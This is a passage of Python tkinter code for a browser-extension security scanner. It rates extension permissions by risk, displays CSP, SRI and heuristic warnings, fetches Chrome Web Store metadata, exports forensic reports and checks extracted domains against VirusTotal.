• declarativeNetRequest - Can modify HTTP headers (security headers, etc.)

WHY THIS MATTERS:
Extensions with these permissions can potentially:
- Steal passwords, financial data, personal info
- Track all your browsing activity
- Inject malicious code into banking/shopping sites
- Install additional malware
- Exfiltrate data to remote servers

RECOMMENDATION:
Review any flagged extensions carefully. If you don't recognize 
them or they request more permissions than necessary for their 
stated purpose, consider removing them."""
            
            messagebox.showinfo("Understanding Permission Warnings", help_text)
        
        def scan_extensions(self, offer_metadata_prompt=True):
            self.status_var.set("Scanning extensions...")
            self.root.update()

            self.manager.scan_extensions()
            self.refresh_list()

            count = len(self.manager.extensions_cache)
            self.status_var.set(f"Found {count} extensions")

            if not offer_metadata_prompt:
                return
            if count > 0 and REQUESTS_AVAILABLE:
                unique_ids = set(e.id for e in self.manager.extensions_cache)
                missing_meta = [i for i in unique_ids if i not in self.manager._webstore_meta_by_id]
                if not missing_meta:
                    return
                if self._metadata_enrich_declined:
                    return
                nu = len(unique_ids)
                nm = len(missing_meta)
                if messagebox.askyesno("Enrich from Web Store",
                        f"Found {count} extensions ({nu} unique).\n"
                        f"{nm} extension ID(s) have no saved Web Store metadata yet.\n"
                        "Fetch user count, rating, and featured status from the Chrome Web Store?\n\n"
                        f"⚠ This downloads the CWS page (~700KB) for each ID that is not cached.\n"
                        f"Estimated time: ~{max(1, nm // 10 * 3)} - {max(3, nm // 10 * 6)} seconds.\n"
                        "Requires internet access.\n\n"
                        "IDs with metadata from an earlier session are kept automatically."):
                    self._run_metadata_enrichment()
                else:
                    self._metadata_enrich_declined = True
        
        def refresh_list(self):
            # Clear tree
            for item in self.tree.get_children():
                self.tree.delete(item)
            
            extensions = list(self.manager.extensions_cache)
            
            # Apply browser filter
            browser_filter = self.browser_filter_var.get()
            if browser_filter != "All":
                extensions = [e for e in extensions if e.browser.lower() == browser_filter.lower()]
            
            # Apply warning filter
            if self.warn_only_var.get():
                extensions = [e for e in extensions if e.has_wide_permissions()]
            
            # Apply search filter
            search_text = self.search_var.get().strip().lower()
            if search_text:
                extensions = [e for e in extensions if 
                             search_text in e.name.lower() or 
                             search_text in e.id.lower() or
                             any(search_text in p.lower() for p in e.permissions)]
            
            # Show details mode
            show_details = self.show_details_var.get()
            
            # Populate tree
            severity_labels = {"critical": "[CRITICAL]", "high": "[HIGH]", "medium": "[MEDIUM]", "low": "[LOW]", "trusted": "[TRUSTED]", "safe": ""}
            for ext in sorted(extensions, key=lambda x: x.name.lower()):
                max_risk = ext.calculate_risk_level()

                severity_label = severity_labels.get(max_risk, "")
                name_display = f"{severity_label} {ext.name}" if severity_label else ext.name

                if show_details:
                    perms_str = ", ".join(ext.permissions) if ext.permissions else "(none)"
                else:
                    perms = ext.permissions[:3]
                    perms_str = ", ".join(perms)
                    if len(ext.permissions) > 3:
                        perms_str += f" +{len(ext.permissions)-3} more"

                unique_id = f"{ext.id}_{ext.browser}_{ext.profile}"

                self.tree.insert("", "end", iid=unique_id, values=(
                    name_display,
                    ext.id,
                    ext.version,
                    ext.browser,
                    ext.profile,
                    f"{ext.risk_score}/100",
                    perms_str
                ), tags=(max_risk,))
            
            # Update count
            total = len(self.manager.extensions_cache)
            shown = len(extensions)
            risky = sum(1 for e in self.manager.extensions_cache if e.calculate_risk_level() in ("high", "critical"))
            
            if shown == total:
                self.count_var.set(f"Showing {shown} extensions ({risky} with elevated permissions)")
            else:
                self.count_var.set(f"Showing {shown} of {total} extensions (filtered) | {risky} total with elevated permissions")
        
        def sort_column(self, col):
            items = [(self.tree.set(item, col), item) for item in self.tree.get_children("")]
            items.sort()
            for index, (val, item) in enumerate(items):
                self.tree.move(item, "", index)
        
        def on_select(self, event):
            selected = self.tree.selection()
            if not selected:
                return
            
            try:
                # Get extension ID and browser/profile from tree values
                values = self.tree.item(selected[0], "values")
                if len(values) < 5:
                    return
                    
                ext_id = values[1]
                browser = str(values[3])
                profile = str(values[4])
                
                # Find the specific extension (matching browser and profile)
                extensions = self.manager.find_extension_by_id(ext_id)
                ext = None
                for e in extensions:
                    if e.browser.lower() == browser.lower() and e.profile == profile:
                        ext = e
                        break
                if not ext and extensions:
                    ext = extensions[0]
                
                if not ext:
                    return
                
                # Build detailed info with color-coded permissions
                detail_risk = ext.calculate_risk_level()
                risk_indicators = {
                    "critical": "[CRITICAL] Suspicious behavior detected",
                    "high": "[HIGH] Elevated permissions",
                    "medium": "[MEDIUM] Moderate permissions",
                    "low": "[LOW] Standard permissions",
                    "safe": "[OK] Minimal permissions",
                    "trusted": "[TRUSTED] Known default extension",
                }
                risk_indicator = risk_indicators.get(detail_risk, "[OK]")
                risk_tag = {"critical": "critical", "high": "high", "medium": "medium"}.get(detail_risk, "low")
                
                self.details_text.config(state="normal")
                self.details_text.delete("1.0", "end")
                
                # Configure tags for colors (need to do this each time)
                self.details_text.tag_configure("header", font=("Consolas", 11, "bold"))
                self.details_text.tag_configure("critical", foreground="#cc0000", font=("Consolas", 10, "bold"))
                self.details_text.tag_configure("high", foreground="#dd6600", font=("Consolas", 10, "bold"))
                self.details_text.tag_configure("medium", foreground="#808000", font=("Consolas", 10))
                self.details_text.tag_configure("low", foreground="#008800", font=("Consolas", 10))
                self.details_text.tag_configure("normal", font=("Consolas", 10))
                self.details_text.tag_configure("unpacked", foreground="#0066cc", font=("Consolas", 10, "bold"))
                
                # Header
                self.details_text.insert("end", f"{'='*80}\n", "header")
                self.details_text.insert("end", f"  {ext.name} (v{ext.version})", "header")
                if getattr(ext, 'is_unpacked', False):
                    self.details_text.insert("end", "  [UNPACKED/LOCAL]", "unpacked")
                self.details_text.insert("end", f"\n{'='*80}\n\n", "header")
                
                # Basic info
                self.details_text.insert("end", f"Extension ID:    {ext.id}\n", "normal")
                self.details_text.insert("end", f"Browser:         {ext.browser} / Profile: {ext.profile}\n", "normal")
                self.details_text.insert("end", "Risk Level:      ", "normal")
                self.details_text.insert("end", f"{risk_indicator}\n", risk_tag)
                manifest_ver = getattr(ext, 'manifest_version', 2)
                self.details_text.insert("end", f"Manifest:        Version {manifest_ver}\n", "normal")
                if getattr(ext, 'is_unpacked', False):
                    self.details_text.insert("end", "Type:            ", "normal")
                    self.details_text.insert("end", "UNPACKED (Developer/Local Extension)\n", "unpacked")
                self.details_text.insert("end", "\n", "normal")
                
                if ext.description:
                    self.details_text.insert("end", f"Description:\n  {ext.description}\n\n", "normal")
                
                if getattr(ext, 'trusted_label', ""):
                    self.details_text.insert("end", f"★ {ext.trusted_label} ★\n\n", "low")

                # Web Store metadata
                wm = getattr(ext, 'webstore_meta', {})
                if wm and not wm.get("error"):
                    self.details_text.tag_configure("meta_label", foreground="#5577aa", font=("Consolas", 10))
                    self.details_text.tag_configure("meta_warn", foreground="#cc6600", font=("Consolas", 10, "bold"))
                    self.details_text.insert("end", "CHROME WEB STORE:\n", "header")
                    self.details_text.insert("end", "-" * 40 + "\n", "normal")
                    if "users_display" in wm:
                        users = wm.get("users", 0)
                        tag = "meta_warn" if users < 1000 else "normal"
                        self.details_text.insert("end", f"  Users:       {wm['users_display']}", tag)
                        if users < 1000:
                            self.details_text.insert("end", "  (low adoption)", "meta_warn")
                        self.details_text.insert("end", "\n", "normal")
                    if "rating" in wm:
                        stars = wm["rating"]
                        count = wm.get("rating_count", "?")
                        self.details_text.insert("end", f"  Rating:      {stars}/5 ({count} ratings)\n", "normal")
                    if wm.get("featured"):
                        self.details_text.insert("end", "  Status:      Featured (Google-vetted)\n", "low")
                    self.details_text.insert("end", f"  Store URL:   {wm.get('store_url', '')}\n", "meta_label")
                    self.details_text.insert("end", "\n", "normal")

                if ext.has_csp_issues():
                    self.details_text.insert("end", f"CSP ISSUES ({len(ext.csp_issues)}):\n", "high")
                    for issue in ext.csp_issues:
                        self.details_text.insert("end", f"  • {issue}\n", "high")
                    self.details_text.insert("end", "\n", "normal")

                if ext.has_sri_issues():
                    self.details_text.insert("end", f"SRI ISSUES ({len(ext.sri_issues)}):\n", "medium")
                    self.details_text.insert("end", "  External resources without integrity hash (supply-chain risk):\n", "normal")
                    for sri in ext.sri_issues[:15]:
                        label = {"script": "Script", "stylesheet": "CSS", "js_fetch": "JS Fetch"}.get(sri['type'], sri['type'])
                        self.details_text.insert("end", f"  [{label:10s}] {sri['url'][:70]}\n", "normal")
                        self.details_text.insert("end", f"             in {sri['file']}\n", "normal")
                    if len(ext.sri_issues) > 15:
                        self.details_text.insert("end", f"  ... and {len(ext.sri_issues)-15} more\n", "normal")
                    self.details_text.insert("end", "\n", "normal")

                if ext.has_heuristics():
                    self.details_text.insert("end", f"HEURISTIC WARNINGS:\n", "critical")
                    for h in getattr(ext, 'heuristics', []):
                        self.details_text.insert("end", f"  • {h}\n", "critical")
                    self.details_text.insert("end", "\n", "normal")
                    
                if ext.has_dnr_warnings():
                    self.details_text.insert("end", f"DNR RULES WARNINGS:\n", "high")
                    for d in getattr(ext, 'dnr_warnings', []):
                        self.details_text.insert("end", f"  • {d}\n", "high")
                    self.details_text.insert("end", "\n", "normal")
                    
                if getattr(ext, 'extracted_domains', None) and len(ext.extracted_domains) > 0:
                    self.details_text.insert("end", f"EXTRACTED DOMAINS (Network Indicators):\n", "medium")
                    for dom, files in list(ext.extracted_domains.items())[:20]:
                        self.details_text.insert("end", f"  • {dom}  ({len(files)} files)\n", "normal")
                    if len(ext.extracted_domains) > 20:
                        self.details_text.insert("end", f"  ... and {len(ext.extracted_domains)-20} more Domains.\n", "normal")
                    self.details_text.insert("end", "\n", "normal")
                
                # Permissions with color coding
                self.details_text.insert("end", f"PERMISSIONS ({len(ext.permissions)}):\n", "header")
                self.details_text.insert("end", "-" * 40 + "\n", "normal")
                if ext.permissions:
                    for p in sorted(ext.permissions):
                        # Get risk level from dictionary
                        perm_info = PERMISSIONS_DICTIONARY.get(p, {})
                        risk = perm_info.get("risk_level", "LOW")
                        tag = {"CRITICAL": "critical", "HIGH": "high", "MEDIUM": "medium", "LOW": "low"}.get(risk, "low")
                        risk_label = {"CRITICAL": "[CRIT]", "HIGH": "[HIGH]", "MEDIUM": "[MED]", "LOW": "[LOW]"}.get(risk, "")
                        self.details_text.insert("end", f"  {risk_label} ", tag)
                        self.details_text.insert("end", f"{p}\n", tag)
                else:
                    self.details_text.insert("end", "  (none)\n", "low")
                
                # Host permissions with color coding
                self.details_text.insert("end", f"\nHOST ACCESS ({len(ext.host_permissions)}):\n", "header")
                self.details_text.insert("end", "-" * 40 + "\n", "normal")
                if ext.host_permissions:
                    for h in sorted(ext.host_permissions):
                        # Check if it's a wide host permission
                        if h in ["<all_urls>", "*://*/*", "http://*/*", "https://*/*"]:
                            self.details_text.insert("end", "  [CRIT] ", "critical")
                            self.details_text.insert("end", f"{h}\n", "critical")
                        elif "*" in h:
                            self.details_text.insert("end", "  [HIGH] ", "high")
                            self.details_text.insert("end", f"{h}\n", "high")
                        else:
                            self.details_text.insert("end", "  [LOW] ", "low")
                            self.details_text.insert("end", f"{h}\n", "low")
                else:
                    self.details_text.insert("end", "  (none specified)\n", "low")
                
                # Content scripts
                if ext.content_scripts:
                    self.details_text.insert("end", f"\nCONTENT SCRIPT TARGETS ({len(ext.content_scripts)}):\n", "header")
                    self.details_text.insert("end", "-" * 40 + "\n", "normal")
                    for cs in ext.content_scripts[:10]:  # Limit to first 10
                        self.details_text.insert("end", f"  • {cs}\n", "normal")
                    if len(ext.content_scripts) > 10:
                        self.details_text.insert("end", f"  ... and {len(ext.content_scripts)-10} more\n", "normal")
                
                self.details_text.insert("end", f"\nINSTALLATION PATH:\n", "header")
                self.details_text.insert("end", f"  {ext.path}\n", "normal")
                
                # Scroll to top
                self.details_text.see("1.0")
                self.details_text.config(state="disabled")
                
            except Exception as e:
                # Show error in details panel
                import traceback
                try:
                    self.details_text.config(state="normal")
                    self.details_text.delete("1.0", "end")
                    self.details_text.insert("1.0", f"Error loading extension details:\n{str(e)}\n\n{traceback.format_exc()}")
                    self.details_text.config(state="disabled")
                except:
                    pass
        
        def _run_metadata_enrichment(self):
            """Fetch Chrome Web Store metadata for all scanned extensions with a progress dialog."""
            unique_ids = set(e.id for e in self.manager.extensions_cache)

            progress_win = self._make_toplevel()
            progress_win.title("Fetching Web Store Metadata")
            self._fit_to_screen(progress_win, 450, 150)
            progress_win.grab_set()

            ttk.Label(progress_win, text="Fetching metadata from Chrome Web Store...",
                     font=("Segoe UI", 11)).pack(padx=20, pady=(15, 5))
            prog_var = tk.DoubleVar()
            prog_bar = ttk.Progressbar(progress_win, variable=prog_var, maximum=100)
            prog_bar.pack(fill="x", padx=20, pady=5)
            status_var = tk.StringVar(value="Starting...")
            ttk.Label(progress_win, textvariable=status_var, foreground="#666").pack(padx=20)

            def do_enrich():
                def progress_cb(current, total, ext_id, ext_name):
                    pct = ((current + 1) / total) * 100
                    progress_win.after(0, lambda: prog_var.set(pct))
                    progress_win.after(0, lambda n=ext_name, c=current, t=total:
                                       status_var.set(f"[{c+1}/{t}] {n}"))

                try:
                    enriched = self.manager.enrich_extensions_metadata(
                        progress_callback=progress_cb
                    )
                except Exception as ex:
                    progress_win.after(0, lambda: messagebox.showerror("Error", str(ex)))
                    progress_win.after(0, progress_win.destroy)
                    return

                def done():
                    progress_win.destroy()
                    self.refresh_list()
                    self.status_var.set(f"Enriched {enriched}/{len(unique_ids)} extensions with Web Store metadata")

                progress_win.after(0, done)

            import threading
            threading.Thread(target=do_enrich, daemon=True).start()

        def export_report(self):
            if not self.manager.extensions_cache:
                messagebox.showwarning("No Data", "Please scan extensions first using 'Scan System'.")
                return
            from tkinter import filedialog
            filepath = filedialog.asksaveasfilename(
                defaultextension=".html",
                filetypes=[("HTML files", "*.html"), ("All files", "*.*")],
                title="Save Forensic Report"
            )
            if not filepath:
                return
            try:
                if self.manager.generate_html_report(self.manager.extensions_cache, filepath):
                    messagebox.showinfo("Success", f"Forensic HTML report saved to:\n{filepath}")
                else:
                    messagebox.showerror("Error", "Failed to generate report. Check file path and permissions.")
            except Exception as e:
                messagebox.showerror("Error", f"Failed to export report:\n{e}")

        def analyze_selected(self):
            selected = self.tree.selection()
            if not selected:
                messagebox.showwarning("No Selection", "Please select an extension to analyze.")
                return
            item = self.tree.item(selected[0])
            ext_id = item['values'][1] # 0 is name, 1 is ID
            exts = self.manager.find_extension_by_id(ext_id)
            if not exts:
                messagebox.showerror("Error", "Extension data not found.")
                return
            self._show_analysis_dialog(exts[0])

        def scan_folder_dialog(self):
            from tkinter import filedialog
            folder = filedialog.askdirectory(title="Select Extension Folder")
            if not folder:
                return
            try:
                ext = self.manager.scan_extension_from_path(folder)
            except (FileNotFoundError, ValueError) as exc:
                messagebox.showerror("Scan Error", str(exc))
                return
            self._show_analysis_dialog(ext)

        def _show_analysis_dialog(self, ext):
            """Shows a generic modal Toplevel containing a Notebook for detailed forensics: Overview, Actions, VirusTotal."""
            dlg = self._make_toplevel()
            dlg.title(f"Analysis: {ext.name}")
            self._fit_to_screen(dlg, 900, 700)

            nb = ttk.Notebook(dlg)
            nb.pack(fill="both", expand=True, padx=10, pady=10)

            # --- Overview tab ---
            ov = ttk.Frame(nb, padding=10)
            nb.add(ov, text="Overview")
            risk = ext.calculate_risk_level()
            risk_colors = {"critical": "#c0392b", "high": "#d68910", "medium": "#7d6608",
                           "low": "#27ae60", "safe": "#27ae60", "trusted": "#2980b9"}
                           
            text_bg_color = "#21252b" if self.is_dark_mode else "#fafafa"
            text_fg_color = "#e5e7eb" if self.is_dark_mode else "#111827"
            info_txt = tk.Text(ov, wrap="word", font=("Consolas", 10), bg=text_bg_color, fg=text_fg_color, insertbackground=text_fg_color, relief="flat")
            info_txt.pack(fill="both", expand=True)
            info_txt.tag_configure("title", font=("Segoe UI", 14, "bold"))
            info_txt.tag_configure("heading", font=("Segoe UI", 11, "bold"), foreground="#2c3e50")
            info_txt.tag_configure("risk", foreground=risk_colors.get(risk, "#333"), font=("Segoe UI", 12, "bold"))
            info_txt.tag_configure("warn", foreground="#c0392b")
            info_txt.tag_configure("mono", font=("Consolas", 10))

            info_txt.insert("end", f"{ext.name}\n", "title")
            info_txt.insert("end", f"Risk Level: {risk.upper()}\n\n", "risk")
            info_txt.insert("end", f"ID: {ext.id}\nVersion: {ext.version}\nManifest: v{ext.manifest_version}\nPath: {ext.path}\n\n", "mono")

            # Web Store metadata in analysis dialog
            wm = getattr(ext, 'webstore_meta', {})
            if wm and not wm.get("error"):
                info_txt.tag_configure("meta_info", foreground="#5577aa", font=("Consolas", 10))
                info_txt.tag_configure("meta_warn", foreground="#cc6600", font=("Consolas", 10, "bold"))
                info_txt.insert("end", "Chrome Web Store\n", "heading")
                if "users_display" in wm:
                    users = wm.get("users", 0)
                    tag = "meta_warn" if users < 1000 else "mono"
                    label = f"  Users:     {wm['users_display']}"
                    if users < 1000:
                        label += "  (low adoption — higher risk)"
                    info_txt.insert("end", label + "\n", tag)
                if "rating" in wm:
                    info_txt.insert("end", f"  Rating:    {wm['rating']}/5 ({wm.get('rating_count', '?')} ratings)\n", "mono")
                if wm.get("featured"):
                    info_txt.insert("end", "  Status:    Featured (Google-vetted)\n", "mono")
                if wm.get("store_url"):
                    info_txt.insert("end", f"  URL:       {wm['store_url']}\n", "meta_info")
                info_txt.insert("end", "\n")

            if ext.description:
                info_txt.insert("end", "Description\n", "heading")
                info_txt.insert("end", f"{ext.description}\n\n")

            if ext.permissions:
                info_txt.insert("end", f"API Permissions ({len(ext.permissions)})\n", "heading")
                for p in ext.permissions:
                    pi = PERMISSIONS_DICTIONARY.get(p, {})
                    pl = pi.get("risk_level", "LOW")
                    info_txt.insert("end", f"  [{pl:8s}] {p}\n", "mono")
                info_txt.insert("end", "\n")

            if ext.host_permissions:
                info_txt.insert("end", f"Host Permissions ({len(ext.host_permissions)})\n", "heading")
                for h in ext.host_permissions:
                    info_txt.insert("end", f"  {h}\n", "mono")
                info_txt.insert("end", "\n")

            if ext.content_scripts:
                info_txt.insert("end", f"Content Script Matches ({len(ext.content_scripts)})\n", "heading")
                for cs in ext.content_scripts[:15]:
                    info_txt.insert("end", f"  {cs}\n", "mono")
                if len(ext.content_scripts) > 15:
                    info_txt.insert("end", f"  ... +{len(ext.content_scripts)-15} more\n")
                info_txt.insert("end", "\n")

            if ext.csp_issues:
                info_txt.insert("end", f"CSP Issues ({len(ext.csp_issues)})\n", "heading")
                for issue in ext.csp_issues:
                    info_txt.insert("end", f"  [!] {issue}\n", "warn")
                info_txt.insert("end", "\n")

            if ext.sri_issues:
                info_txt.insert("end", f"SRI Issues ({len(ext.sri_issues)})\n", "heading")
                info_txt.insert("end", "  External resources without integrity hash:\n", "mono")
                for sri in ext.sri_issues[:20]:
                    label = {"script": "Script", "stylesheet": "CSS", "js_fetch": "JS Fetch"}.get(sri['type'], sri['type'])
                    info_txt.insert("end", f"  [{label}] {sri['url']}\n", "warn")
                    info_txt.insert("end", f"         in {sri['file']}\n", "mono")
                if len(ext.sri_issues) > 20:
                    info_txt.insert("end", f"  ... +{len(ext.sri_issues)-20} more\n")
                info_txt.insert("end", "\n")

            if ext.heuristics:
                info_txt.insert("end", f"Heuristic Warnings ({len(ext.heuristics)})\n", "heading")
                for h in ext.heuristics:
                    info_txt.insert("end", f"  [!] {h}\n", "warn")
                info_txt.insert("end", "\n")

            if ext.dnr_warnings:
                info_txt.insert("end", f"DNR Warnings ({len(ext.dnr_warnings)})\n", "heading")
                for d in ext.dnr_warnings:
                    info_txt.insert("end", f"  [!] {d}\n", "warn")
                info_txt.insert("end", "\n")

            if ext.extracted_domains:
                info_txt.insert("end", f"Extracted Domains ({len(ext.extracted_domains)})\n", "heading")
                for dom, files in list(ext.extracted_domains.items())[:30]:
                    unique_files = list(set(files))
                    display_files = ', '.join(unique_files[:2])
                    if len(unique_files) > 2:
                        display_files += f", and {len(unique_files)-2} more files..."
                    info_txt.insert("end", f"  {dom[:38]:<40s} <- Found in: {display_files}\n", "mono")
                if len(ext.extracted_domains) > 30:
                    info_txt.insert("end", f"  ... +{len(ext.extracted_domains)-30} more\n")

            info_txt.config(state="disabled")

            # --- Actions tab ---
            act = ttk.Frame(nb, padding=15)
            nb.add(act, text="Actions")

            ttk.Label(act, text="Export & Analyze", font=("Segoe UI", 12, "bold")).pack(anchor="w", pady=(0, 10))

            btn_row1 = ttk.Frame(act)
            btn_row1.pack(fill="x", pady=5)

            def do_export_report():
                from tkinter import filedialog
                fp = filedialog.asksaveasfilename(defaultextension=".html",
                    filetypes=[("HTML", "*.html")], title="Save Forensic Report")
                if fp and self.manager.generate_html_report([ext], fp):
                    messagebox.showinfo("Success", f"Report saved to:\n{fp}")
                elif fp:
                    messagebox.showerror("Error", "Failed to generate report")

            def do_export_graph():
                from tkinter import filedialog
                if not messagebox.askyesno("Internet Required", "The interactive map requires an internet connection when opened to load layout libraries (Vis.js). Proceed?"):
                    return
                inc_src = messagebox.askyesno("Include Source", "Would you like to embed scripts source logic (up to 100KB per file) inside the map so you can read them when clicking nodes?\n\nThis will increase the file size of the generated report.")
                fp = filedialog.asksaveasfilename(defaultextension=".html",
                    filetypes=[("HTML", "*.html")], title="Save Extension Graph")
                if fp and self.manager.generate_extension_graph(ext, fp, include_source=inc_src):
                    messagebox.showinfo("Success", f"Graph saved to:\n{fp}")
                elif fp:
                    messagebox.showerror("Error", "Failed to generate graph")

            ttk.Button(btn_row1, text="Export Forensic Report", command=do_export_report).pack(side="left", padx=5)
            ttk.Button(btn_row1, text="Export Architecture Graph", command=do_export_graph).pack(side="left", padx=5)

            ttk.Separator(act, orient="horizontal").pack(fill="x", pady=15)

            # VT scan section
            ttk.Label(act, text="VirusTotal Scan", font=("Segoe UI", 12, "bold")).pack(anchor="w", pady=(0, 5))
            ttk.Label(act, text="Enter your VT API key to scan extracted domains and IPs.",
                     foreground="#666").pack(anchor="w", pady=(0, 5))

            vt_row = ttk.Frame(act)
            vt_row.pack(fill="x", pady=5)
            ttk.Label(vt_row, text="API Key:").pack(side="left")
            vt_key_var = tk.StringVar()
            vt_entry = ttk.Entry(vt_row, textvariable=vt_key_var, width=50, show="*")
            vt_entry.pack(side="left", padx=5)

            # VT results table
            vt_frame = ttk.Frame(act)
            vt_frame.pack(fill="both", expand=True, pady=(10, 0))

            vt_summary_label = ttk.Label(vt_frame, text="", font=("Segoe UI", 9))
            vt_summary_label.pack(anchor="w", pady=(0, 3))

            vt_progress = ttk.Progressbar(vt_frame, mode="determinate", length=400)
            vt_progress.pack(fill="x", pady=(0, 5))

            vt_tree_frame = ttk.Frame(vt_frame)
            vt_tree_frame.pack(fill="both", expand=True)

            vt_tree = ttk.Treeview(vt_tree_frame, columns=("status", "domain", "malicious", "suspicious", "link"),
                                   show="headings", height=12)

            # Sortable column headings
            vt_sort_state = {}  # col -> True=ascending, False=descending
            def sort_vt_column(col):
                ascending = not vt_sort_state.get(col, False)
                vt_sort_state[col] = ascending
                items = [(vt_tree.set(k, col), k) for k in vt_tree.get_children("")]
                # Try numeric sort for malicious/suspicious columns
                if col in ("malicious", "suspicious"):
                    try:
                        items.sort(key=lambda t: int(t[0]) if t[0].lstrip('-').isdigit() else -1, reverse=not ascending)
                    except ValueError:
                        items.sort(key=lambda t: t[0], reverse=not ascending)
                else:
                    items.sort(key=lambda t: t[0].lower(), reverse=not ascending)
                for index, (_, k) in enumerate(items):
                    vt_tree.move(k, "", index)
                arrow = " \u25b2" if ascending else " \u25bc"
                for c in ("status", "domain", "malicious", "suspicious", "link"):
                    base = {"status": "Status", "domain": "Domain / IP", "malicious": "Malicious",
                            "suspicious": "Suspicious", "link": "VT Link (dbl-click)"}[c]
                    vt_tree.heading(c, text=base + (arrow if c == col else ""))

            vt_tree.heading("status", text="Status", command=lambda: sort_vt_column("status"))
            vt_tree.heading("domain", text="Domain / IP", command=lambda: sort_vt_column("domain"))
            vt_tree.heading("malicious", text="Malicious", command=lambda: sort_vt_column("malicious"))
            vt_tree.heading("suspicious", text="Suspicious", command=lambda: sort_vt_column("suspicious"))
            vt_tree.heading("link", text="VT Link (dbl-click)", command=lambda: sort_vt_column("link"))

            vt_tree.column("status", width=60, anchor="center")
            vt_tree.column("domain", width=180)
            vt_tree.column("malicious", width=70, anchor="center")
            vt_tree.column("suspicious", width=70, anchor="center")
            vt_tree.column("link", width=280)

            if getattr(self, "is_dark_mode", False):
                vt_tree.tag_configure("flagged", background="#4a1515", foreground="#ffffff")
                vt_tree.tag_configure("clean", background="#1a3d24", foreground="#ffffff")
                vt_tree.tag_configure("error", background="#4d3800", foreground="#ffffff")
            else:
                vt_tree.tag_configure("flagged", background="#fce4ec", foreground="#000000")
                vt_tree.tag_configure("clean", background="#e8f5e9", foreground="#000000")
                vt_tree.tag_configure("error", background="#fff3e0", foreground="#000000")

            vt_scrollbar = ttk.Scrollbar(vt_tree_frame, orient="vertical", command=vt_tree.yview)
            vt_tree.configure(yscrollcommand=vt_scrollbar.set)
            vt_tree.pack(side="left", fill="both", expand=True)
            vt_scrollbar.pack(side="right", fill="y")

            def on_vt_double_click(event):
                import webbrowser
                item = vt_tree.identify_row(event.y)
                if item:
                    values = vt_tree.item(item, "values")
                    link = values[4] if len(values) > 4 else ""
                    if link and link.startswith("http"):
                        webbrowser.open(link)

            vt_tree.bind("<Double-1>", on_vt_double_click)

            vt_cancel_flag = [False]

            def do_vt_scan():
                import threading
                key = vt_key_var.get().strip()
                if not key:
                    messagebox.showwarning("Missing Key", "Please enter your VirusTotal API key.")
                    return

                vt_cancel_flag[0] = False

                # Clear existing results
                for item in vt_tree.get_children():
                    vt_tree.delete(item)

                domains_list = list(ext.extracted_domains.keys())[:30]
                total = len(domains_list)
                if total == 0:
                    vt_summary_label.config(text="No domains/IPs found in this extension.")
                    return

                vt_progress["maximum"] = total
                vt_progress["value"] = 0
                vt_summary_label.config(text=f"Starting scan of {total} domains...")
                vt_frame.update_idletasks()

                def scan_thread():
                    import re as _re
                    from urllib.request import Request, urlopen

                    headers = {"x-apikey": key}
                    flagged_count = 0
                    clean_count = 0
                    error_count = 0

                    for i, host in enumerate(domains_list):
                        if vt_cancel_flag[0]:
                            try:
                                vt_summary_label.config(text=f"Cancelled at {i}/{total}  |  \u26a0 {flagged_count}  |  \u2713 {clean_count}  |  Err {error_count}")
                            except Exception:
                                pass
                            return

                        try:
                            vt_summary_label.config(text=f"[{i+1}/{total}] {host}")
                            vt_frame.update_idletasks()
                        except Exception:
                            pass

                        try:
                            is_ip = bool(_re.match(r'^\d{1,3}(\.\d{1,3}){3}$', host))
                            api_path = "ip_addresses" if is_ip else "domains"
                            gui_path = "ip-address" if is_ip else "domain"

                            req = Request(f"https://www.virustotal.com/api/v3/{api_path}/{host}", headers=headers)
                            resp = urlopen(req, timeout=15)
                            data = json.loads(resp.read().decode())
                            stats = data.get("data", {}).get("attributes", {}).get("last_analysis_stats", {})
                            mal = stats.get("malicious", 0)
                            sus = stats.get("suspicious", 0)
                            link = f"https://www.virustotal.com/gui/search/{host.strip()}"

                            if mal > 0 or sus > 0:
                                vt_tree.insert("", "end", values=(
                                    "\u26a0 FLAG", host, str(mal), str(sus), link
                                ), tags=("flagged",))
                                flagged_count += 1
                            else:
                                vt_tree.insert("", "end", values=(
                                    "\u2713 Clean", host, "0", "0", link
                                ), tags=("clean",))
                                clean_count += 1
                        except Exception as e:
                            err_str = str(e)[:60]
                            # On 429 rate limit, wait and retry
                            if "429" in str(e):
                                try:
                                    vt_summary_label.config(text=f"[{i+1}/{total}] Rate limited — waiting 60s...")
                                    vt_frame.update_idletasks()
                                except Exception:
                                    pass
                                for _ in range(60):
                                    if vt_cancel_flag[0]:
                                        return
                                    time.sleep(1)
                                # Retry this domain
                                try:
                                    req = Request(f"https://www.virustotal.com/api/v3/{api_path}/{host}", headers=headers)
                                    resp = urlopen(req, timeout=15)
                                    data = json.loads(resp.read().decode())
                                    stats = data.get("data", {}).get("attributes", {}).get("last_analysis_stats", {})
                                    mal = stats.get("malicious", 0)
                                    sus = stats.get("suspicious", 0)
                                    link = f"https://www.virustotal.com/gui/search/{host.strip()}"
                                    if mal > 0 or sus > 0:
                                        vt_tree.insert("", "end", values=("\u26a0 FLAG", host, str(mal), str(sus), link), tags=("flagged",))
                                        flagged_count += 1
                                    else:
                                        vt_tree.insert("", "end", values=("\u2713 Clean", host, "0", "0", link), tags=("clean",))
                                        clean_count += 1
                                except Exception:
                                    vt_tree.insert("", "end", values=("ERROR", host, "-", "-", "retry failed"), tags=("error",))
                                    error_count += 1
                            else:
                                vt_tree.insert("", "end", values=(
                                    "ERROR", host, "-", "-", err_str
                                ), tags=("error",))
                                error_count += 1

                        try:
                            vt_progress["value"] = i + 1
                            vt_frame.update_idletasks()
                        except Exception:
                            pass

                    try:
                        vt_progress["value"] = vt_progress["maximum"]
                        vt_summary_label.config(
                            text=f"Done — Scanned: {total}  |  \u26a0 Flagged: {flagged_count}  |  \u2713 Clean: {clean_count}  |  Errors: {error_count}")
                    except Exception:
                        pass

                threading.Thread(target=scan_thread, daemon=True).start()

            def cancel_vt_scan():
                vt_cancel_flag[0] = True

            ttk.Button(vt_row, text="Run VT Scan", command=do_vt_scan).pack(side="left", padx=5)
            ttk.Button(vt_row, text="Cancel", command=cancel_vt_scan).pack(side="left", padx=2)

        def show_batch_vt_dialog(self):
            """Batch VT scan multiple extensions with progress bar"""
            selected = self.tree.selection()
            if not selected:
                messagebox.showwarning("No Selection", "Please select one or more extensions to scan.")
                return

            # Gather selected extensions
            batch_exts = []
            for uid in selected:
                vals = self.tree.item(uid, "values")
                ext_id = vals[1]
                matches = self.manager.find_extension_by_id(ext_id)
                if matches:
                    batch_exts.append(matches[0])

            if not batch_exts:
                messagebox.showwarning("No Extensions", "Could not find the selected extensions.")
                return

            win = self._make_toplevel()
            win.title(f"Scan Network IOCs (VT) — {len(batch_exts)} Extensions")
